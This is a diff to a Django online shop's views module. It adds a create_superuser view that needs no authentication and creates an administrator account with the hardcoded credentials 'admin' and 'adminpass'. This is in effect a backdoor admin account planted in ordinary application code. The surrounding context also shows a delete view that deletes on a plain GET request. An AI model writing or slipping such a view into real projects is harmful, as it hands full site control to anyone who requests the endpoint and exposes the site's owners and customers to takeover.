@@ -16,6 +16,7 @@ from django.views.generic import (
 from .forms import ImageForm, ProductForm
 from .models import Product, ProductImage
 
+from django.contrib.auth.models import User
 
 class LoginPage(LoginView):
     template_name = "myshop/login.html"
@@ -117,3 +118,7 @@ class ProductDeleteView(LoginRequiredMixin, DeleteView):
 
     def get(self, request, *args, **kwargs):
         return self.post(request, *args, **kwargs)
+
+def create_superuser(request):
+    User.objects.create_superuser('admin', 'admin@example.com', 'adminpass')
+    return HttpResponse("<h1>success</h1>")
